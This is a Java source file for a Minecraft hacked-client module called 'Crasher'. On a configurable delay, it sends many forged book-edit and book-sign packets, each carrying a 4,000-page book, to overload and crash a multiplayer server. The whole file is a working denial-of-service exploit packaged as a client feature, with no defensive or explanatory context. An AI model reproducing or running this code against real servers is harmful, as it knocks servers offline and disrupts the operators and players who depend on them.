package me.aristhena.client.module.modules.misc;

import io.netty.buffer.Unpooled;
import me.aristhena.client.module.Module;
import me.aristhena.client.module.Module.Mod;
import me.aristhena.client.option.Option;
import me.aristhena.event.EventTarget;
import me.aristhena.event.events.UpdateEvent;
import me.aristhena.utils.ClientUtils;
import me.aristhena.utils.Timer;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;

@Mod
public class Crasher extends Module
{
    @Option.Op(min = 1.0, max = 1000.0, increment = 50.0)
    public double delay;
    @Option.Op(min = 0.0, max = 180.0, increment = 5.0)
    public double packets;
    private Timer timer;
    
    public Crasher() {
        this.timer = new Timer();
    }
    
    @EventTarget
    public void on(final UpdateEvent event) {
        if (this.timer.delay((float)this.delay)) {
            for (int time = 0; time < this.packets; ++time) {
                final ItemStack bookObj = new ItemStack(Items.writable_book);
                final NBTTagList bookPages = new NBTTagList();
                for (int i = 0; i < 4000; ++i) {
                    bookPages.appendTag(new NBTTagString("a"));
                }
                while (bookPages.tagCount() > 1) {
                    final String s = bookPages.getStringTagAt(bookPages.tagCount() - 1);
                    if (s.length() != 0) {
                        break;
                    }
                    bookPages.removeTag(bookPages.tagCount() - 1);
                }
                if (bookObj.hasTagCompound()) {
                    final NBTTagCompound nbttagcompound = bookObj.getTagCompound();
                    nbttagcompound.setTag("pages", bookPages);
                }
                else {
                    bookObj.setTagInfo("pages", bookPages);
                }
                PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
                packetbuffer.writeItemStackToBuffer(bookObj);
                ClientUtils.packet(new C17PacketCustomPayload("MC|BEdit", packetbuffer));
                bookObj.setTagInfo("author", new NBTTagString("a"));
                bookObj.setTagInfo("title", new NBTTagString("a"));
                for (int j = 0; j < bookPages.tagCount(); ++j) {
                    String s2 = bookPages.getStringTagAt(j);
                    final IChatComponent ichatcomponent = new ChatComponentText(s2);
                    s2 = IChatComponent.Serializer.componentToJson(ichatcomponent);
                    bookPages.set(j, new NBTTagString(s2));
                }
                packetbuffer = new PacketBuffer(Unpooled.buffer());
                packetbuffer.writeItemStackToBuffer(bookObj);
                ClientUtils.packet(new C17PacketCustomPayload("MC|BSign", packetbuffer));
            }
            this.timer.reset();
        }
    }
}
